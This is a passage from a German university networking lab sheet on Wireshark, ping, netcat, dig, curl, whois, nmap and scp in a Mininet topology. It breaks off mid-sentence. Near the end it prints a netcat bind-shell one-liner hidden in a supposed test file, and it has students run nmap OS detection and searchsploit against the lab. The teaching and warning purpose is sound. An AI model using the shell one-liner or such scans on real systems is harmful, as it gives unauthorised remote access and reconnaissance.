# 01 · Netzwerkgrundlagen & Tools

[:material-file-pdf-box: Als PDF herunterladen](../../pdf/01-netzwerkgrundlagen-tools.pdf){ .md-button }

![Desktop direkt nach dem Login: am linken Rand die Symbole "Home", "File System", "Terminal", "Praktikumsaufgaben" und "Datenschutz-Hinweis.txt", oben rechts der Logout-Knopf, in der Mitte das CaDS-Logo, unten die Statusleiste mit Sitzungsname und Bau-Kennung](../assets/screenshots/01-netzwerkgrundlagen-tools/desktop-default.png)
*Der Desktop direkt nach dem ersten Login – das Terminal startet ihr über das Symbol "Terminal" am linken Rand, abmelden könnt ihr euch oben rechts.*

## Lernziele

- Das TCP/IP-Schichtenmodell nicht nur benennen, sondern in echtem, mit
  Wireshark aufgezeichnetem Verkehr wiedererkennen (Verbindungs-, Netzwerk-,
  Transport- und Anwendungsschicht).
- Grundlegende Netzwerkwerkzeuge sicher anwenden: `ping`, `netcat`, `dig`,
  `curl`, `whois`, `nmap`, `scp`, `netstat`.
- Den Unterschied zwischen numerischer IP-Adresse und Namensauflösung (DNS)
  sowie zwischen Anwendungsprotokoll (HTTP) und Dienstprotokoll (DNS, DHCP)
  einordnen können.
- Verschlüsselte und unverschlüsselte Kommunikation im Wireshark-Mitschnitt
  unterscheiden (Klartext-Netcat/HTTP vs. SSH/SCP/HTTPS) und die Grenzen von
  Verschlüsselung benennen (Metadaten bleiben sichtbar, auch wenn der Inhalt
  es nicht ist).
- Einen fehlerhaften TLS-Zertifikat-Zustand im Browser erkennen und
  begründen können, statt ihn wegzuklicken.
- Nachvollziehen, warum in einer gerouteten Topologie nicht jeder Rechner
  jeden anderen direkt erreicht (asymmetrisches Routing).
- Namensauflösung nicht nur benutzen, sondern selbst betreiben: einen kleinen,
  lesbaren DNS-Server starten und an `dig`/`nslookup`/`host` sehen, wie eine
  DNS-Antwort aus Header, Flags, Frage- und Antwortabschnitt entsteht.
- Offene Ports und lauschende Dienste mit `ss` (dem Nachfolger von `netstat`)
  ermitteln und den Klartext-Charakter einfacher TCP-Verbindungen im
  Mitschnitt erkennen.

--8<-- "issue-feedback.md"

## Aufgaben

### Teil 1 – Das TCP/IP-Schichtenmodell in echtem Verkehr (außerhalb von Mininet)

Dieser erste Teil läuft **nicht** in der Mininet-Emulation, sondern direkt auf
eurem Desktop, um reale Kommunikation ins Internet zu beobachten, bevor wir
uns die kontrollierte, emulierte Topologie von `topo01` ansehen.

#### Das Terminal öffnen

Das Standard-Terminal auf diesem Desktop ist `xfce4-terminal`. Ihr startet es
über das Terminal-Symbol am linken Bildschirmrand (siehe Symbol "Terminal" im
Bild ganz oben auf dieser Seite).

!!! info "Werkzeug: `xfce4-terminal` und `xterm` – der Unterschied"
    `xfce4-terminal` ist ein vollwertiger Desktop-Terminalemulator mit Tabs,
    eigenen Einstellungen (Schrift, Farben) und komfortablem Kopieren/
    Einfügen per Maus – offizielle Doku:
    [docs.xfce.org/apps/xfce4-terminal/getting-started](https://docs.xfce.org/apps/xfce4-terminal/getting-started).
    `xterm` ist dagegen ein deutlich älterer, minimalistischer
    X11-Terminalemulator ohne diesen Komfort; in diesem Praktikum taucht er
    ausschließlich als Konsole für einzelne Mininet-Knoten auf – der Befehl
    `mininet> xterm h1` in Teil 2 startet technisch tatsächlich `xterm`,
    nicht `xfce4-terminal`.

**Übung:** Öffnet jetzt ein Terminal über das Symbol und lasst es für die
folgenden Schritte offen – merkt euch dabei kurz sein Aussehen (Tableiste
oben, Menüleiste File/Edit/View/...). Sobald ihr in Teil 2 mit
`mininet> xterm h1` ein Mininet-Knotenfenster öffnet, vergleicht beide
Fenster bewusst nebeneinander: Das `xterm`-Fenster hat weder Tableiste noch
Menü und wirkt sichtbar schlichter – das ist der oben beschriebene
Unterschied ganz praktisch zu sehen, nicht nur behauptet.

#### Schritt 1: Wireshark starten und aufzeichnen

!!! info "Werkzeug: `sudo` – was es tut und warum es hier nötig ist"
    `sudo` führt den nachfolgenden Befehl mit erhöhten Rechten aus (Kurzform
    für "substitute user, do"). Wireshark braucht diese erhöhten Rechte, weil
    das Mitschneiden von Netzwerk-Rohpaketen einen privilegierten Zugriff auf
    die Netzwerkschnittstellen voraussetzt – ein gewöhnlicher Nutzer darf das
    aus Sicherheitsgründen nicht. Offizielle Referenz:
    [sudo.ws/docs/man/sudo.man](https://www.sudo.ws/docs/man/sudo.man/).
    **In dieser Umgebung fragt `sudo` dabei nicht nach einem Passwort** – nach
    `sudo wireshark` und Enter startet das Programm sofort, ohne Rückfrage.

!!! info "Werkzeug: Wireshark – was es tut"
    Wireshark ist ein Netzwerk-Protokollanalysator: Es schneidet den
    Verkehr auf einer oder mehreren Schnittstellen mit und zeigt jedes
    einzelne Paket samt aller enthaltenen Protokollschichten an. Wir nutzen
    es hier, um genau nachzuvollziehen, was beim Aufruf von Kommandos wie
    `nslookup`, `curl` oder `ping` tatsächlich über das Netz (oder eben nicht
    über das Netz, siehe Schritt 6) geht. Offizielle Doku:
    [wireshark.org/docs](https://www.wireshark.org/docs/).

1. Tippt im offenen Terminal:

    ```bash
    sudo wireshark
    ```

    Nach Enter öffnet sich (ohne Passwortabfrage, siehe Hinweis oben) das
    Wireshark-Hauptfenster mit der Willkommensseite. Im Bereich "Capture"
    seht ihr eine Liste der Schnittstellen, unter anderem `eth0`, `any` und
    `Loopback: lo`.

2. Wählt die Zeile **`any`** aus (sie fasst alle Schnittstellen in einer
    Aufzeichnung zusammen – genau das braucht ihr hier: Schritt 2 und 6
    erzeugen nämlich rein lokalen Verkehr, der `eth0` nie erreicht, siehe
    Hinweis in Schritt 2) und öffnet über `Capture → Options…` (oder
    `Strg+K`) die Aufzeichnungsoptionen. Wählt dort unten links den Haken
    **"Enable promiscuous mode on all interfaces" ab**, bevor ihr startet:

    ![Wireshark Capture Options: Zeile „any" ausgewählt, Spalte „Link-layer Header" zeigt „Linux cooked v1" für any und „Ethernet" für eth0/lo, der Haken „Enable promiscuous mode on all interfaces" unten links ist abgewählt](../assets/screenshots/01-netzwerkgrundlagen-tools/wireshark-interfaces-promiscuous.png)
    *Die empfohlene Einstellung vor dem Start: „any" ausgewählt, Promiscuous-Modus abgewählt.*

    !!! warning "Falls ihr trotzdem eine Fehlermeldung seht"
        ![Wireshark-Fehlerdialog „Promiscuous mode not supported on the 'any' device" mit OK-Knopf, im Hintergrund eine bereits laufende, noch leere Aufzeichnung auf „any"](../assets/screenshots/01-netzwerkgrundlagen-tools/wireshark-promiscuous-error.png)
        *Diese Meldung erscheint, wenn der Promiscuous-Haken beim Start noch gesetzt war.*

        Grund: Die Pseudo-Schnittstelle `any` fasst mehrere echte
        Schnittstellen zusammen und unterstützt deshalb selbst keinen
        Promiscuous-Modus. Der ist ohnehin nur dafür gedacht, auf einer
        EINZELNEN echten Netzwerkkarte auch fremden, nicht an sie
        adressierten Verkehr auf einem geteilten Segment mitzuschneiden –
        das wollen wir hier nicht, wir wollen nur unseren eigenen
        Container-Verkehr sehen. Bestätigt die Meldung einfach mit OK:
        Wireshark nimmt danach automatisch ohne Promiscuous-Modus auf, ganz
        genau wie mit dem vorher abgewählten Haken.

3. Klickt "Start". Die Aufzeichnung läuft jetzt auf `any`.

    !!! note "Was ihr jetzt seht: die Paketliste läuft voll – das ist normal"
        Sobald die Aufzeichnung läuft, füllt sich die obere Paketliste
        kontinuierlich. Das ist der **gesamte** Verkehr aller
        Schnittstellen, inklusive Hintergrundrauschen des Betriebssystems
        und des Desktop-Streamings, über das ihr diesen Desktop überhaupt
        erst im Browser seht – nicht nur der Verkehr, den ihr gleich selbst
        erzeugt. Drei Fensterbereiche sind ab jetzt wichtig:

        - oben die **Paketliste** (eine Zeile pro Paket),
        - in der Mitte der **Detailbaum** (Schicht für Schicht aufklappbar –
          genau den braucht ihr in Schritt 5),
        - unten die **Hex-/ASCII-Rohdaten** des gerade ausgewählten Pakets.

        Um nicht im Rauschen suchen zu müssen, tippt oben in die Zeile
        "Apply a display filter…" – den **Anzeigefilter**, nicht zu
        verwechseln mit dem Aufzeichnungsfilter aus den Capture-Optionen.
        Genau das macht ihr gleich in Schritt 4. Wer lieber in Ruhe durch
        eine feste Liste scrollen will, statt live mitzuhalten, kann die
        Aufzeichnung jederzeit über das rote Quadrat-Symbol in der
        Symbolleiste stoppen und später erneut starten.

#### Schritt 2: `nslookup` – die IP-Adresse ermitteln

!!! info "Werkzeug: `nslookup` – was es tut"
    `nslookup` fragt einen DNS-Server nach der IP-Adresse, die zu einem
    Domainnamen gehört (Namensauflösung) – grundsätzlich das, was ein
    Browser vor jedem Seitenaufruf automatisch im Hintergrund erledigt.
    **Was es hier für uns tut:** Es ermittelt die IPv4-Adresse von
    `becke.net`, damit wir den Wireshark-Mitschnitt in Schritt 4 gezielt auf
    genau diese Adresse filtern können, statt im gesamten Verkehr zu suchen.

1. Öffnet ein **zweites** Terminal (Wireshark läuft im ersten weiter) und
    führt aus:

    ```bash
    nslookup becke.net
    ```

    Die Ausgabe sieht etwa so aus (eure IP-Adresse kann abweichen):

    ```text
    Server:      127.0.0.11
    Address:     127.0.0.11#53

    Non-authoritative answer:
    Name:  becke.net
    Address: 81.169.145.66
    ```

    Merkt euch die ausgegebene IPv4-Adresse – ihr braucht sie gleich für den
    Wireshark-Filter.

2. Wechselt zu Wireshark und tippt in die Anzeigefilter-Zeile oben `dns`,
    dann Enter, um die soeben erzeugte DNS-Abfrage wiederzufinden:

    ![Wireshark mit Anzeigefilter „dns": Paketliste zeigt „Standard query ... A becke.net" und die Antwort „Standard query response ... A becke.net A 81.169.145.66" zwischen 127.0.0.1 und 127.0.0.11](../assets/screenshots/01-netzwerkgrundlagen-tools/wireshark-dns-filter.png)
    *Die DNS-Anfrage (Protokollspalte „DNS") und ihre Antwort, direkt nach `nslookup becke.net`.*

    Ihr seht die Anfrage ("Standard query … A becke.net") und die Antwort
    ("Standard query response … A becke.net A …") als eigene Zeilen mit
    Protokoll "DNS".

    !!! note "Warum diese Pakete zwischen 127.0.0.1 und 127.0.0.11 laufen"
        Die DNS-Anfrage geht in dieser Desktop-Umgebung nicht direkt ins
        Internet, sondern an den eingebauten DNS-Resolver eures Containers
        (`127.0.0.11`) – ihr seht hier also lokalen Verkehr, keinen Verkehr
        zu einem Server im Internet. Das ist mit ein Grund, warum in
        Schritt 1 auf der Pseudo-Schnittstelle `any` mitgeschnitten wird und
        nicht nur auf `eth0`: `any` erfasst ALLE Schnittstellen einschließlich
        dieses rein lokalen Verkehrs.

#### Schritt 3: `curl` – Verkehr zur ermittelten Adresse erzeugen

!!! info "Werkzeug: `curl` – was es tut"
    `curl` ist ein Kommandozeilenwerkzeug, um eine Anfrage an einen Server zu
    schicken und dessen Antwort abzurufen – hier eine HTTPS-Anfrage an
    `becke.net`, so wie es ein Browser beim Aufruf der Seite ebenfalls täte,
    nur ohne grafische Darstellung. **Was es hier für uns tut:** Es erzeugt
    gezielt echten Verkehr zur zuvor ermittelten Adresse, den wir im nächsten
    Schritt im Mitschnitt wiederfinden.

```bash
curl https://becke.net
```

(Die Ausgabe ist der HTML-Quelltext der Seite – für diesen Schritt selbst
nicht wichtig, wichtig ist nur, dass der Aufruf Netzwerkverkehr erzeugt.)

#### Schritt 4: Auf den erzeugten Verkehr filtern

Filtert in Wireshark auf genau diesen Verkehr, damit ihr nicht im restlichen
Hintergrundrauschen des Betriebssystems sucht:

```text
ip.addr == <eure ermittelte IP-Adresse>
```

#### Schritt 5: Die vier Schichten im Detailbaum identifizieren

!!! info "Was ist überhaupt eine „Schicht"?"
    Das TCP/IP-Modell teilt Netzwerkkommunikation in mehrere **Schichten**
    auf. Jede Schicht löst dabei ein eigenes, abgegrenztes Teilproblem
    (z. B. "wie kommen Bits über ein Kabel/Funk" oder "wie findet ein Paket
    den richtigen Rechner im Internet") und verpackt dafür die Daten der
    jeweils darüberliegenden Schicht in ihren eigenen Umschlag (Header) –
    von den Anwendungsdaten ganz oben bis zu den elektrischen/optischen
    Bits ganz unten. Diese Unterteilung gibt es, damit jede Schicht
    unabhängig von den anderen ausgetauscht oder verstanden werden kann:
    Ethernet lässt sich durch WLAN ersetzen, ohne dass HTTP davon etwas
    merkt. Im Wireshark-Detailbaum (mittlerer Fensterbereich, siehe
    Schritt 1) seht ihr das ganz konkret: Die eingerückten Zeilen SIND die
    Schichten, von außen/unten nach innen/oben aufgeklappt – die äußerste
    Zeile ist die unterste Schicht (Übertragung), die innerste die oberste
    (Anwendung).

Wählt eines der TCP-Pakete dieser Kommunikation aus (ein Klick in der
Paketliste) und klappt im Detailbaum von außen/unten nach innen/oben die
einzelnen Zeilen auf – jede eingerückte Zeile ist eine Schicht:

- **Anwendungsschicht:** HTTP (bzw. TLS-Record bei HTTPS)
- **Transportschicht:** TCP-Segment (Ports, Sequenznummern, Flags)
- **Netzwerkschicht:** IP-Header (IPv4 oder IPv6, Quell-/Zieladresse)
- **Verbindungsschicht:** *siehe Hinweis direkt darunter – hier NICHT der
  klassische Ethernet-Header*

!!! warning "Verbindungsschicht bei „any": kein echter Ethernet-Header"
    Weil ihr auf der Pseudo-Schnittstelle `any` mitschneidet (Schritt 1),
    zeigt die Verbindungsschicht hier **„Linux cooked capture v1"** (kurz
    SLL) statt eines echten Ethernet-Headers – `any` kapselt mehrere,
    unterschiedliche Schnittstellen einheitlich in dieses Pseudo-Format, das
    keinen vollständigen Ethernet-Header (mit Ziel-MAC) kennt, aber
    trotzdem nützliche Link-Layer-Informationen mitbringt:

    ![Aufgeklappter Detailbaum-Eintrag „Linux cooked capture v1" eines TCP-Pakets Richtung becke.net: Packet type „Sent by us (4)", Link-layer address type „Ethernet (1)", Source „96:20:bb:b0:7a:56", Protocol „IPv4 (0x0800)"](../assets/screenshots/01-netzwerkgrundlagen-tools/wireshark-linklayer-real.png)
    *„Linux cooked capture v1" für den Verkehr zu becke.net: „Link-layer address type: Ethernet (1)" und die echte MAC-Adresse eurer Schnittstelle als „Source".*

    Achtet auf zwei Felder: **"Link-layer address type"** (hier `Ethernet
    (1)` – das Paket lief tatsächlich über eine echte, Ethernet-artige
    Schnittstelle) und **"Source"** (eine echte Hardware-MAC-Adresse). Beide
    kommen in Schritt 6 wieder vor, mit einem auffälligen Unterschied.

!!! question "Kurz nachgedacht"
    Auf welcher tatsächlichen Schnittstelle (nicht `any`) lief dieses Paket
    vermutlich – und woran im Detailbaum könnt ihr das festmachen, obwohl
    `any` selbst kein echter Ethernet-Header ist?

#### Vom externen zum lokalen Verkehr: Wechsel zu Schritt 6

Bisher habt ihr Verkehr zu einem echten Server im Internet (`becke.net`)
untersucht. Schritt 6 wechselt bewusst zu **rein lokalem** Verkehr: Ihr
schickt Pakete an euch selbst (`127.0.0.1`, die Loopback-Adresse), die nie
eine echte Netzwerkkarte durchlaufen. Die neue Frage lautet: Wie sieht
dieselbe Schichten-Analyse aus Schritt 5 aus, wenn gar keine echte Hardware
beteiligt ist? Der Aufbau bleibt dabei gleich – ihr filtert wieder in
derselben laufenden Wireshark-Aufzeichnung auf `any`, diesmal nur mit einem
anderen Anzeigefilter (`icmp` statt der IP-Adresse von eben).

#### Schritt 6: `ping 127.0.0.1` – dasselbe Experiment rein lokal

!!! info "Werkzeug: `ping` – was es tut"
    `ping` schickt ICMP-Echo-Request-Pakete an eine Zieladresse und misst,
    ob und wie schnell eine Antwort (Echo-Reply) zurückkommt – der klassische
    Weg zu prüfen, ob ein Rechner grundsätzlich erreichbar ist. **Was es hier
    für uns tut:** Wir zielen bewusst auf uns selbst (`127.0.0.1`), um
    denselben Schichten-Blick wie in Schritt 5 auf rein lokalen Verkehr
    anzuwenden.

```bash
ping 127.0.0.1
```

(`Strg+C` beendet `ping`, falls es weiterläuft – für den Mitschnitt reichen
wenige Sekunden.)

Filtert in Wireshark auf `icmp` und identifiziert erneut die vier Schichten
in einem der Pakete.

!!! warning "Verbindungsschicht bei „any": Loopback statt Ethernet"
    ![Aufgeklappter Detailbaum-Eintrag „Linux cooked capture v1" eines ICMP-Pakets auf 127.0.0.1: Packet type „Unicast to us (0)", Link-layer address type „Loopback (772)", Source „00:00:00_00:00:00 (00:00:00:00:00:00)", Protocol „IPv4 (0x0800)"](../assets/screenshots/01-netzwerkgrundlagen-tools/wireshark-linklayer-loopback.png)
    *„Linux cooked capture v1" für den Loopback-Verkehr: „Link-layer address type: Loopback (772)" und eine Adresse aus lauter Nullen als „Source".*

    Auch hier zeigt die Verbindungsschicht "Linux cooked capture v1" (wie in
    Schritt 5, ein Merkmal der Pseudo-Schnittstelle `any` – kein Widerspruch
    zur ursprünglichen Vermutung, dass hier "kein echter Ethernet-Header"
    steht). Der Unterschied liegt in denselben zwei Feldern wie eben:
    **"Link-layer address type"** steht jetzt auf `Loopback (772)` statt
    `Ethernet (1)`, und **"Source"** ist `00:00:00:00:00:00` – eine
    Adresse aus lauter Nullen, weil hier keine echte Netzwerkkarte beteiligt
    war, die eine eigene MAC-Adresse mitbringen könnte.

!!! question "Kurz nachgedacht"
    Vergleicht die beiden Felder "Link-layer address type" und "Source" aus
    Schritt 5 und Schritt 6 direkt gegenüber. Was sagt eine
    Null-MAC-Adresse über den Weg aus, den ein Paket zurückgelegt hat – und
    welche Erwartung leitet ihr daraus für künftige Mitschnitte ab, wenn ihr
    eine Adresse wie `00:00:00:00:00:00` seht?

!!! example "Vertiefung (optional): Euer Netzwerktechniker-Notizbuch"
    Anders als in einem klassischen Rechnerpool bleibt euer
    Home-Verzeichnis `~/rn-practice` über Login-Sitzungen hinweg erhalten,
    auch wenn der Container zwischenzeitlich neu erzeugt wird (siehe
    [Desktop-/Mininet-Umgebung](../reference/umgebung.md)). Legt euch dort
    schon jetzt eine eigene Datei an, z. B. `~/rn-practice/notizbuch.md`,
    und tragt ab diesem Aufgabenblatt die Befehle und Wireshark-Filter ein,
    die ihr euch beim nächsten Mal nicht neu erarbeiten wollt. Nach sieben
    Aufgabenblättern habt ihr damit eine selbst geschriebene
    Kommandozeilen-Referenz, zugeschnitten auf eure eigenen Stolperfallen –
    das funktioniert nur, weil euer Verzeichnis wirklich persistent ist und
    nicht wie in einem Pool-Rechner beim Abmelden verschwindet.


### Teil 2 – Werkzeuge in der emulierten Topologie `topo01`

Ab hier arbeitet ihr in der Mininet-Emulation. Die Topologie `topo01` besteht
aus zwei Endgeräten `h1` und `h2`, zwei Routern `r1`/`r2` dazwischen sowie
einem NAT-Uplink ins echte Internet.

1. **Netz starten.** Wechselt in das Topologie-Verzeichnis und startet die
    Emulation:

    ```bash
    cd ~/rn-practice/topo01
    ./start-topo01.sh
    ```

    Das Skript ruft zuerst `getIntWithIntenet.sh` auf (ermittelt das
    Netzwerkinterface mit Internetzugang für den NAT-Uplink) und startet
    danach `topo01.py`. In einigen Installationen werdet ihr nach dem
    `sudo`-Passwort (`mininet`) gefragt.

    !!! warning "Reihenfolge beachten"
        Ruft `topo01.py` niemals direkt auf, ohne vorher `getIntWithIntenet.sh`
        laufen zu lassen (das macht `start-topo01.sh` automatisch für euch).
        Details dazu im Abschnitt [Potenzielle Herausforderungen](#potenzielle-herausforderungen)
        unten.

    Nach dem Start öffnen sich automatisch zwei Terminalfenster – eines für
    `h1`, eines für `h2` (Mininet startet diese selbst über seine interne
    `makeTerm()`-Funktion, ihr müsst dafür nichts extra eingeben). Für die
    Router `r1`/`r2` oder falls ihr eines der beiden Fenster versehentlich
    schließt, öffnet ihr auf der Mininet-Konsole ein weiteres Terminal mit:

    ```text
    mininet> xterm <node>
    ```

    z. B. `mininet> xterm r1`. Dieser Befehl bleibt unverändert Teil des
    dokumentierten Mininet-Workflows und funktioniert in der aktuellen
    Umgebung weiterhin genauso wie beschrieben.

    !!! note "Playwright-Screenshot-Referenz"
        Für die Verifikation, dass sich nach `./start-topo01.sh` bzw. nach
        `mininet> xterm <node>` tatsächlich ein Terminalfenster für den Knoten
        öffnet, eignet sich ein **Fenster-Screenshot** (siehe
        `tests/e2e/specs/screenshots.spec.ts`, Test "Fenster-Screenshot:
        Standardterminal ist offen") besser als ein Zeilen-Screenshot: hier
        geht es um den sichtbaren UI-Zustand (ein neues Fenster ist da), nicht
        um eine einzelne Textzeile.

    ![Drei echte xfce4-terminal-Fenster nach dem Start von topo01: links die Mininet-CLI mit dem Ergebnis von `pingall` (75% dropped), rechts oben "Node: h1", rechts unten "Node: h2"](../assets/screenshots/01-netzwerkgrundlagen-tools/topo01-xterm-pingall.png)
    *Die von Mininet automatisch geöffneten Knoten-Terminals sind technisch
    `xfce4-terminal`-Fenster (nicht `xterm`), siehe Hinweis oben. Der
    `pingall`-Befehl auf der Mininet-Konsole zeigt hier live die erwartete
    75-%-Verlustrate zwischen `h1` und `h2` – das ist die in
    [Potenzielle Herausforderungen](#potenzielle-herausforderungen)
    beschriebene, absichtliche asymmetrische Routing-Topologie.*

2. **Konnektivität mit Ping prüfen.** Öffnet das Terminal für `h1` und führt
    nacheinander aus:

    ```bash
    ping -c 4 10.0.6.2        # Ping mit numerischer IPv4-Adresse (h2)
    ping -c 4 h2              # Ping mit Namen statt IP
    ping -c 4 10.0.5.1        # Ping an ein anderes System im lokalen Segment
    ping -c 4 1.1.1.1         # Ping ins Internet (numerisch) - siehe unten!
    ping -c 4 one.one.one.one # Ping ins Internet mit Namen (dasselbe Ziel)
    ```

    Notiert euch die Ausgaben (RTT, TTL) der **lokalen** Ziele und vergleicht
    sie miteinander: Was fällt euch auf, und wie erklärt ihr die Unterschiede?

    Wechselt danach zum Terminal von `h2` und wiederholt das Experiment aus
    dessen Sicht:

    ```bash
    ping -c 4 10.0.1.1
    ping -c 4 h1
    ping -c 4 1.1.1.1
    ```

    Vergleicht RTT und TTL der lokalen Ziele zwischen `h1` und `h2`. Warum sind
    sie unterschiedlich? Was sagt euch das über die Anzahl der Zwischenstationen
    (Hops)?

    !!! warning "Die beiden Internet-Pings schlagen fehl – und das ist die Aufgabe"
        `ping 1.1.1.1` und `ping one.one.one.one` liefern **100 % Paketverlust**.
        Das ist **kein Fehler eures Containers** und auch keine fehlende
        Internet-Anbindung, sondern eine **Filterregel auf dem Weg nach
        draußen**. Weist das selbst nach, statt es zu glauben:

        ```bash
        getent hosts one.one.one.one       # loest der Name auf?
        nc -z -w 3 1.1.1.1 443             # geht eine TCP-Verbindung durch?
        echo $?                            # 0 = Verbindung stand
        traceroute -n -m 6 1.1.1.1         # wo endet der Weg?
        ```

        **Fragen, die ihr aus euren eigenen Ausgaben beantwortet:**

        1. Der Name löst auf, und die TCP-Verbindung auf Port 443 kommt
           zustande – welche Schicht des Stapels ist also **nicht** das Problem?
        2. `ping` nutzt ICMP, `nc` nutzt TCP. Beide laufen über IP. Was genau
           wird demnach gefiltert, und auf welcher Schicht sitzt der Filter?
        3. `traceroute` zeigt euch die letzte antwortende Station vor der
           Stille. Liegt der Filter **in eurem Container**, im **Hostnetz** oder
           **weiter draußen**? Begründet mit der Hop-Nummer.
        4. Warum ist "kein Ping-Echo" ein **schlechter** Beweis dafür, dass ein
           Rechner nicht erreichbar ist? Nennt zwei Gründe.

        Diese Asymmetrie – ICMP gesperrt, TCP erlaubt – ist in Unternehmens- und
        Hochschulnetzen der Normalfall, nicht die Ausnahme. Wer sie kennt,
        verschwendet bei einer Störungssuche keine Zeit mit dem falschen
        Werkzeug.

        *Am 2026-09-24 in dieser Umgebung gemessen: `1.1.1.1`, `8.8.8.8` und
        `9.9.9.9` jeweils 100 % Verlust, `1.1.1.1:443` per TCP erreichbar,
        `traceroute` endet nach der zweiten Station.*

    !!! info "h1 ↔ h2 direkt: erreichbar, aber spürbar langsam"
        Ein direkter `ping` zwischen `h1` und `h2` kommt an. Am 2026-09-25 in
        dieser Umgebung gemessen: `5 packets transmitted, 5 received, 0% packet
        loss`, Laufzeit `min/avg/max = 60,2/72,5/121,0 ms`. Auffällig ist nicht
        Verlust, sondern die **Laufzeit**: rund 60 ms statt Bruchteilen einer
        Millisekunde. Das ist **kein Fehler der Umgebung**, sondern Absicht:
        `h1` und `h2` liegen in unterschiedlichen Subnetzen und sind nur über
        die Router `r1`/`r2` mit asymmetrischem Routing verbunden. Genau das
        ist die Beobachtung, die die nächste Teilaufgabe von euch einfordert –
        siehe auch
        [Potenzielle Herausforderungen](#potenzielle-herausforderungen).

3. **Ping mit Wireshark beobachten.** Öffnet auf `h2` Wireshark im
    Hintergrund und wählt das Interface `h2-eth0` aus:

    ```bash
    wireshark &
    ```

    Wechselt zum Terminal von `h1` und sendet einen einzelnen Ping:

    ```bash
    ping -c 1 h2
    ```

    ![Wireshark-Fenster mit laufendem Capture auf h2-eth0, Anzeigefilter icmp gesetzt, Paketliste mit abwechselnden Echo-Request/-Reply zwischen 10.0.1.2 und 10.0.6.2, Detailbereich mit aufgeklappten Ethernet-, IP- und ICMP-Headern und Hex-Dump](../assets/screenshots/01-netzwerkgrundlagen-tools/wireshark-icmp-layers.png)
    *Echter Mitschnitt auf `h2-eth0`, während `h1` per `ping` Verkehr zu `h2`
    erzeugt. Der Detailbereich zeigt genau die in Teil 1 gesuchten Schichten:
    Ethernet II (Verbindungsschicht), Internet Protocol Version 4
    (Netzwerkschicht) und das ICMP-Paket selbst.*

    Welche Protokolle erscheinen in der Spalte "Protocol"? Wiederholt den
    Ping noch zwei weitere Male (`ping -c 1 h2`) – welche Pakettypen
    wiederholen sich, welche nicht? Führt anschließend `ping -c 1 10.0.2.3`
    aus (eine nicht existierende Adresse) und beobachtet den Unterschied.
    Schließt danach das Wireshark-Fenster von `h2`, startet Wireshark
    stattdessen auf `h1` (Interface `h1-eth0`, nicht vergessen: `wireshark &`
    mit `&`, damit das Terminal weiter benutzbar bleibt) und wiederholt
    `ping -c 1 10.0.2.3`. Vergleicht, was auf beiden Seiten sichtbar ist, und
    formuliert eine These, warum sich die Beobachtung unterscheidet.

4. **Kommunikation mit Netcat herstellen und mit Wireshark beobachten.**
    Startet auf `h2` (im Verzeichnis `~/rn-practice/topo01`) den vorbereiteten
    UDP-Netcat-Server:

    ```bash
    ./startUDPServerNetcat.sh
    ```

    Der Inhalt des Skripts (`cat startUDPServerNetcat.sh`) zeigt euch, dass es
    letztlich nur `netcat -ul 8080` aufruft – ein UDP-Listener auf Port 8080.
    Wechselt zu `h1` und verbindet euch:

    ```bash
    netcat -u h2 8080
    hallo
    ```

    Markiert in Wireshark (auf `h2`, Interface `h2-eth0`) das letzte
    UDP-Paket. Im unteren Fensterbereich ("Packet Bytes") seht ihr die
    Nutzdaten hexadezimal und in ASCII – euer "hallo" sollte dort auftauchen.
    Prüft, wie viele Bytes die Nutzdaten tatsächlich belegen und warum
    (Stichwort ASCII-Kodierung, ein Zeichen = ein Byte).

5. **DNS-Auflösung mit Dig.** Auf `h1` läuft ein leichtgewichtiger
    DNS-Forwarder/DHCP-Server (`dnsmasq`). Führt aus:

    ```bash
    dig bundesregierung.de
    ```

    und sucht in der `ANSWER SECTION` nach der aufgelösten IPv4-Adresse.

6. **HTTP/REST mit Curl gegen eine externe API, und der gleiche Dienst im
    Browser.** Fragt mit Curl die Geolocation-API von ip-api.com ab (ersetzt
    die Beispieladresse durch die zuvor per `dig` ermittelte):

    ```bash
    curl http://ip-api.com/json/<ermittelte-IP-Adresse>
    ```

    Vergleicht das Ergebnis mit dem Aufruf derselben Abfrage im Browser unter
    `https://ip-api.com/#<ermittelte-IP-Adresse>`. Welche Darstellung eignet
    sich für die automatische Weiterverarbeitung durch ein Programm, welche
    für einen Menschen?

    !!! info "Wer betreibt ip-api.com?"
        Laut dem offiziellen Impressum/den Nutzungsbedingungen von
        ip-api.com wird der Dienst von **Artia International S.R.L.**
        (Bukarest, Rumänien) betrieben.

7. **WHOIS-Abfrage.** Auf `h1`:

    ```bash
    whois mozilla.com
    ```

    Achtet auf Felder wie Street/City. Wiederholt die Abfrage mit
    `bundesregierung.de` und vergleicht: Für `.de`-Domains ist die DENIC
    zuständig, und seit der DSGVO sind personenbezogene WHOIS-Daten für
    `.de`-Domains nicht mehr standardmäßig öffentlich einsehbar.

8. **Netzwerkscan mit Nmap.** Auf `h2`:

    ```bash
    nmap -sn 10.0.4.0/24
    ```

    Prüft, welche Hosts erkannt werden. Versucht anschließend, das
    Betriebssystem eines gefundenen Hosts zu identifizieren:

    ```bash
    nmap -O <gefundene-IP>
    ```

    Findet heraus, auf welchem Host der Dienst OpenSSH erreichbar ist, und
    prüft mit `searchsploit`, ob es bekannte Schwachstellen gibt:

    ```bash
    searchsploit OpenSSH
    ```

    Port-Scans dienen hier ausschließlich der eigenen, isolierten
    Mininet-Umgebung. Gegen fremde Systeme ohne Zustimmung sind sie in
    Deutschland rechtlich heikel und teils strafbar.

9. **Sichere Übertragung mit SCP, und was trotz Verschlüsselung sichtbar
    bleibt.** Startet auf `h2` Wireshark (Interface `h2-eth0`). Startet auf
    `h1` den SSH-Server:

    ```bash
    /usr/sbin/sshd -D -f sshd.conf
    ```

    Kopiert anschließend von `h2` aus eine Datei von `h1`:

    ```bash
    scp mininet@10.0.1.2:~/rn-practice/test30M.txt ./
    ```

    !!! info "Wo `test30M.txt` liegt"
        Die Datei liegt direkt unter `~/rn-practice/` (Wurzel des
        vendorierten Verzeichnisses), NICHT unter `~/rn-practice/topo01/`
        (per Repository-Struktur verifiziert, siehe
        `mininet-labs/rn-practice/test30M.txt`).

    !!! warning "test30M.txt enthält eine echte Reverse-Shell – das ist Absicht"
        `test30M.txt` heißt zwar wie eine ~30-MB-Testdatei, enthält aber
        tatsächlich nur einen kurzen Netcat-Bind-Shell-Einzeiler
        (`mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 1234 >/tmp/f`) plus
        Selbstlöschung, kommentiert als "Dieses ist ein geheimes Script". Eine
        frühere Fassung dieser Anleitung stufte das fälschlich als
